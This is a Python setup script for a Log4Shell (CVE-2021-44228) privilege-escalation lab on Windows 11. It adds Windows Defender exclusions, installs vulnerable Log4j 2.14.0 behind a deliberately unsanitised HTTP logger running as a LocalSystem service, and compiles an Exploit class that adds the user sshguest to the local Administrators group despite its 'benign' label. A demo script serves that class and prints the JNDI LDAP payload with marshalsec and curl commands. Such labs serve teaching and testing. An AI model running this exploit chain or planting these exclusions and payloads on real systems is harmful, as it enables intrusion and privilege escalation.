#!/usr/bin/env python3
"""
Log4Shell Demonstration Environment Setup
========================================
Sets up a Windows 11 system for CVE-2021-44228 (Log4Shell) demonstration.
Creates vulnerable Java services that can be exploited by low-privilege users.

MUST BE RUN AS ADMINISTRATOR on the target Windows system.
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import shutil
import json
from pathlib import Path

class Log4ShellSetup:
    def __init__(self):
        self.lab_dir = Path("C:/lab")
        self.java_dir = self.lab_dir / "java"
        self.marshalsec_dir = self.lab_dir / "marshalsec"
        self.vulnerable_app_dir = self.lab_dir / "vulnerable-app"
        self.exploits_dir = self.lab_dir / "exploits"
        self.nssm_dir = self.lab_dir / "nssm"

    def check_admin(self):
        """Verify script is running as administrator"""
        try:
            return subprocess.run(
                ["net", "session"],
                capture_output=True,
                check=True
            ).returncode == 0
        except:
            return False

    def run_powershell(self, command):
        """Execute PowerShell command and return result"""
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True
        )
        if result.returncode != 0:
            print(f"PowerShell error: {result.stderr}")
            return False
        return result.stdout.strip()

    def task1_defender_exclusions(self):
        """Add Windows Defender exclusions for lab directory"""
        print("[1/8] Adding Windows Defender exclusions...")

        exclusions = [
            str(self.lab_dir),
            str(self.lab_dir / "**"),
            "*.jar",
            "*.class"
        ]

        for exclusion in exclusions:
            command = f"Add-MpPreference -ExclusionPath '{exclusion}'"
            if not self.run_powershell(command):
                print(f"Warning: Failed to add exclusion for {exclusion}")

        # Verify exclusions were added
        result = self.run_powershell("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath")
        print(f"Current exclusions include: {result}")
        print("✓ Defender exclusions configured")

    def task2_install_java(self):
        """Download and install Java 8 JDK"""
        print("[2/8] Installing Java 8 JDK...")

        # Create Java directory
        self.java_dir.mkdir(parents=True, exist_ok=True)

        # Download OpenJDK 8 (using Adoptium/Eclipse Temurin)
        java_url = "https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u382-b05/OpenJDK8U-jdk_x64_windows_hotspot_8u382b05.zip"
        java_zip = self.java_dir / "openjdk8.zip"

        print("Downloading OpenJDK 8...")
        urllib.request.urlretrieve(java_url, java_zip)

        # Extract Java
        with zipfile.ZipFile(java_zip, 'r') as zip_ref:
            zip_ref.extractall(self.java_dir)

        # Find extracted directory
        java_home = None
        for item in self.java_dir.iterdir():
            if item.is_dir() and "jdk" in item.name.lower():
                java_home = item
                break

        if not java_home:
            raise Exception("Failed to find extracted Java directory")

        # Set environment variables
        java_bin = java_home / "bin"
        self.run_powershell(f'[Environment]::SetEnvironmentVariable("JAVA_HOME", "{java_home}", "Machine")')

        # Add to PATH
        current_path = self.run_powershell('[Environment]::GetEnvironmentVariable("PATH", "Machine")')
        if str(java_bin) not in current_path:
            new_path = f"{current_path};{java_bin}"
            self.run_powershell(f'[Environment]::SetEnvironmentVariable("PATH", "{new_path}", "Machine")')

        # Clean up
        java_zip.unlink()

        print(f"✓ Java 8 installed at {java_home}")
        return java_home

    def task3_download_dependencies(self):
        """Download Marshalsec and Log4j dependencies"""
        print("[3/8] Downloading Marshalsec and dependencies...")

        # Create directories
        self.marshalsec_dir.mkdir(parents=True, exist_ok=True)

        # Download Marshalsec source
        marshalsec_url = "https://github.com/mbechler/marshalsec/archive/refs/heads/master.zip"
        marshalsec_zip = self.marshalsec_dir / "marshalsec.zip"

        print("Downloading Marshalsec...")
        urllib.request.urlretrieve(marshalsec_url, marshalsec_zip)

        # Extract Marshalsec
        with zipfile.ZipFile(marshalsec_zip, 'r') as zip_ref:
            zip_ref.extractall(self.marshalsec_dir)

        # Download vulnerable Log4j version
        log4j_url = "https://archive.apache.org/dist/logging/log4j/2.14.0/apache-log4j-2.14.0-bin.zip"
        log4j_zip = self.lab_dir / "log4j-2.14.0.zip"

        print("Downloading Log4j 2.14.0...")
        urllib.request.urlretrieve(log4j_url, log4j_zip)

        # Extract Log4j
        with zipfile.ZipFile(log4j_zip, 'r') as zip_ref:
            zip_ref.extractall(self.lab_dir)

        # Clean up
        marshalsec_zip.unlink()
        log4j_zip.unlink()

        print("✓ Dependencies downloaded")

    def task4_build_vulnerable_app(self, java_home):
        """Build minimal vulnerable HTTP server"""
        print("[4/8] Building vulnerable application...")

        self.vulnerable_app_dir.mkdir(parents=True, exist_ok=True)

        # Find Log4j directory
        log4j_dir = None
        for item in self.lab_dir.iterdir():
            if item.is_dir() and "apache-log4j" in item.name:
                log4j_dir = item
                break

        if not log4j_dir:
            raise Exception("Log4j directory not found")

        # Create vulnerable Java application
        vulnerable_app_java = self.vulnerable_app_dir / "VulnerableApp.java"
        vulnerable_app_java.write_text('''
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import java.net.InetSocketAddress;
import java.io.IOException;
import java.io.OutputStream;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
        server.createContext("/", new LogHandler());
        server.setExecutor(null);

        System.out.println("Vulnerable Log4j server started on http://localhost:8080");
        logger.info("Server started - waiting for requests");

        server.start();
    }

    static class LogHandler implements HttpHandler {
        private static final Logger logger = LogManager.getLogger(LogHandler.class);

        public void handle(HttpExchange exchange) throws IOException {
            String userInput = exchange.getRequestHeaders().getFirst("User-Agent");
            if (userInput == null) {
                userInput = exchange.getRequestURI().getQuery();
            }
            if (userInput == null) {
                userInput = "anonymous";
            }

            // VULNERABLE: Log user input directly
            logger.info("Request from: " + userInput);

            String response = "Request logged successfully";
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}
        ''')

        # Build classpath
        log4j_core = log4j_dir / "log4j-core-2.14.0.jar"
        log4j_api = log4j_dir / "log4j-api-2.14.0.jar"

        if not log4j_core.exists() or not log4j_api.exists():
            raise Exception("Log4j JAR files not found")

        # Compile
        java_exe = java_home / "bin" / "javac.exe"
        classpath = f"{log4j_core};{log4j_api}"

        compile_result = subprocess.run([
            str(java_exe),
            "-cp", classpath,
            str(vulnerable_app_java)
        ], capture_output=True, text=True)

        if compile_result.returncode != 0:
            raise Exception(f"Compilation failed: {compile_result.stderr}")

        print("✓ Vulnerable application built")
        return log4j_dir

    def task5_build_exploit_class(self, java_home):
        """Build Exploit.class with benign payload"""
        print("[5/8] Building exploit payload...")

        self.exploits_dir.mkdir(parents=True, exist_ok=True)

        # Create exploit class that adds user to Administrators group
        exploit_java = self.exploits_dir / "Exploit.java"
        exploit_java.write_text('''
import java.io.IOException;

public class Exploit {
    static {
        try {
            // Benign demonstration: create evidence file as SYSTEM
            Process p = Runtime.getRuntime().exec("cmd.exe /c echo EXPLOITED > C:\\\\lab\\\\exploit_proof.txt");
            p.waitFor();

            // Optional: Add sshguest to local administrators (for demo purposes)
            Process p2 = Runtime.getRuntime().exec("cmd.exe /c net localgroup administrators sshguest /add");
            p2.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Exploit() {
        System.out.println("Exploit payload executed!");
    }
}
        ''')

        # Compile exploit
        javac_exe = java_home / "bin" / "javac.exe"
        compile_result = subprocess.run([
            str(javac_exe),
            str(exploit_java)
        ], capture_output=True, text=True)

        if compile_result.returncode != 0:
            raise Exception(f"Exploit compilation failed: {compile_result.stderr}")

        print("✓ Exploit payload built")

    def task6_download_nssm(self):
        """Download NSSM (Non-Sucking Service Manager)"""
        print("[6/8] Downloading NSSM...")

        self.nssm_dir.mkdir(parents=True, exist_ok=True)

        nssm_url = "https://nssm.cc/release/nssm-2.24.zip"
        nssm_zip = self.nssm_dir / "nssm.zip"

        urllib.request.urlretrieve(nssm_url, nssm_zip)

        # Extract NSSM
        with zipfile.ZipFile(nssm_zip, 'r') as zip_ref:
            zip_ref.extractall(self.nssm_dir)

        nssm_zip.unlink()

        # Find nssm.exe
        nssm_exe = None
        for root, dirs, files in os.walk(self.nssm_dir):
            if "nssm.exe" in files:
                nssm_exe = Path(root) / "nssm.exe"
                break

        if not nssm_exe:
            raise Exception("nssm.exe not found")

        print(f"✓ NSSM downloaded at {nssm_exe}")
        return nssm_exe

    def task7_create_services(self, java_home, log4j_dir, nssm_exe):
        """Create Windows services for vulnerable app and LDAP server"""
        print("[7/8] Creating Windows services...")

        java_exe = java_home / "bin" / "java.exe"

        # Build classpath for vulnerable app
        log4j_core = log4j_dir / "log4j-core-2.14.0.jar"
        log4j_api = log4j_dir / "log4j-api-2.14.0.jar"
        vulnerable_classpath = f"{self.vulnerable_app_dir};{log4j_core};{log4j_api}"

        # Create batch file for vulnerable app
        vulnerable_bat = self.vulnerable_app_dir / "run_vulnerable_app.bat"
        vulnerable_bat.write_text(f'''
@echo off
cd /d "{self.vulnerable_app_dir}"
"{java_exe}" -cp "{vulnerable_classpath}" VulnerableApp
''')

        # Install vulnerable app as service
        subprocess.run([
            str(nssm_exe), "install", "VulnerableApp",
            str(vulnerable_bat)
        ], check=True)

        # Configure service to run as LocalSystem
        subprocess.run([
            str(nssm_exe), "set", "VulnerableApp", "ObjectName", "LocalSystem"
        ], check=True)

        # Set service to auto-start
        subprocess.run([
            "sc", "config", "VulnerableApp", "start=", "auto"
        ], check=True)

        # Start the service
        subprocess.run(["net", "start", "VulnerableApp"], check=True)

        print("✓ Services created and started")

    def task8_setup_exploit_tools(self, java_home):
        """Set up exploit tools and demo scripts"""
        print("[8/8] Setting up exploit tools...")

        # Create demo exploit script
        demo_script = self.lab_dir / "exploit_demo.py"
        demo_script.write_text('''
#!/usr/bin/env python3
"""
Log4Shell Exploit Demonstration
===============================
Demonstrates CVE-2021-44228 against the vulnerable Java service.

Usage: python exploit_demo.py [target_ip]
"""

import sys
import requests
import time
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import socketserver

class ExploitHandler(BaseHTTPRequestHandler):
    """Simple HTTP server to serve exploit class"""
    def do_GET(self):
        if self.path == "/Exploit.class":
            try:
                with open("C:/lab/exploits/Exploit.class", "rb") as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    self.wfile.write(f.read())
                print("[+] Served Exploit.class to victim")
            except FileNotFoundError:
                self.send_error(404)
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        return  # Suppress default logging

def start_exploit_server():
    """Start HTTP server on port 8888 to serve exploit"""
    httpd = HTTPServer(('0.0.0.0', 8888), ExploitHandler)
    print("[+] Exploit server started on http://0.0.0.0:8888")
    httpd.serve_forever()

def main():
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"

    print("Log4Shell (CVE-2021-44228) Demonstration")
    print("=" * 50)
    print(f"Target: {target_ip}:8080")
    print()

    # Start exploit server in background
    server_thread = threading.Thread(target=start_exploit_server, daemon=True)
    server_thread.start()

    time.sleep(2)  # Give server time to start

    # Get attacker IP for JNDI callback
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        attacker_ip = s.getsockname()[0]
        s.close()
    except:
        attacker_ip = "127.0.0.1"

    print(f"[+] Attacker IP: {attacker_ip}")
    print("[+] Starting exploit...")

    # Log4Shell payload
    payload = f"${{jndi:ldap://{attacker_ip}:1389/Exploit}}"

    print(f"[+] Payload: {payload}")

    # Note: This would require a full LDAP server setup
    # For demonstration, we're showing the concept
    print()
    print("FULL EXPLOIT REQUIRES:")
    print("1. LDAP server (Marshalsec) running on port 1389")
    print("2. HTTP server serving Exploit.class")
    print("3. Target making request with malicious User-Agent")
    print()
    print("Example commands:")
    print(f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{attacker_ip}:8888/#Exploit" 1389')
    print(f'curl -H "User-Agent: {payload}" http://{target_ip}:8080/')

if __name__ == "__main__":
    main()
        ''')

        # Create status check script
        status_script = self.lab_dir / "check_setup.py"
        status_script.write_text('''
#!/usr/bin/env python3
"""Check Log4Shell demo environment status"""

import subprocess
import sys
from pathlib import Path

def check_service_status(service_name):
    try:
        result = subprocess.run(
            ["sc", "query", service_name],
            capture_output=True, text=True
        )
        if "RUNNING" in result.stdout:
            return "✓ RUNNING"
        elif "STOPPED" in result.stdout:
            return "⚠ STOPPED"
        else:
            return "? UNKNOWN"
    except:
        return "✗ NOT FOUND"

def check_file_exists(path):
    return "✓ EXISTS" if Path(path).exists() else "✗ MISSING"

def check_port_listening(port):
    try:
        result = subprocess.run(
            ["netstat", "-an"],
            capture_output=True, text=True
        )
        if f":{port}" in result.stdout and "LISTENING" in result.stdout:
            return "✓ LISTENING"
        else:
            return "✗ NOT LISTENING"
    except:
        return "? UNKNOWN"

print("Log4Shell Demo Environment Status")
print("=" * 40)
print()

print("Services:")
print(f"  VulnerableApp Service: {check_service_status('VulnerableApp')}")
print()

print("Network:")
print(f"  Port 8080 (HTTP):      {check_port_listening(8080)}")
print()

print("Files:")
print(f"  Java Installation:     {check_file_exists('C:/lab/java')}")
print(f"  Vulnerable App:        {check_file_exists('C:/lab/vulnerable-app/VulnerableApp.class')}")
print(f"  Exploit Payload:       {check_file_exists('C:/lab/exploits/Exploit.class')}")
print(f"  Marshalsec:            {check_file_exists('C:/lab/marshalsec')}")
print()

# Test basic connectivity
try:
    import requests
    response = requests.get("http://127.0.0.1:8080/", timeout=5)
    if response.status_code == 200:
        print("✓ Vulnerable app responding to HTTP requests")
    else:
        print(f"⚠ Vulnerable app returned status {response.status_code}")
except Exception as e:
    print(f"✗ Cannot connect to vulnerable app: {e}")
        ''')

        print("✓ Exploit tools and demo scripts created")

    def run_setup(self):
        """Run complete setup process"""
        print("Log4Shell Demonstration Environment Setup")
        print("=" * 50)
        print()

        if not self.check_admin():
            print("ERROR: This script must be run as Administrator!")
            sys.exit(1)

        try:
            # Create lab directory
            self.lab_dir.mkdir(exist_ok=True)

            # Run all setup tasks
            self.task1_defender_exclusions()
            java_home = self.task2_install_java()
            self.task3_download_dependencies()
            log4j_dir = self.task4_build_vulnerable_app(java_home)
            self.task5_build_exploit_class(java_home)
            nssm_exe = self.task6_download_nssm()
            self.task7_create_services(java_home, log4j_dir, nssm_exe)
            self.task8_setup_exploit_tools(java_home)

            print()
            print("=" * 50)
            print("✓ SETUP COMPLETE!")
            print()
            print("Your Windows system is now configured for Log4Shell demonstration.")
            print()
            print("Next steps:")
            print(f"1. Run: python {self.lab_dir / 'check_setup.py'}")
            print(f"2. Test: python {self.lab_dir / 'exploit_demo.py'}")
            print("3. SSH as sshguest and run the exploit")
            print()
            print("Vulnerable service running at: http://localhost:8080")
            print("Service runs as LocalSystem - perfect for privilege escalation demo!")

        except Exception as e:
            print(f"\nERROR during setup: {e}")
            sys.exit(1)

if __name__ == "__main__":
    setup = Log4ShellSetup()
    setup.run_setup()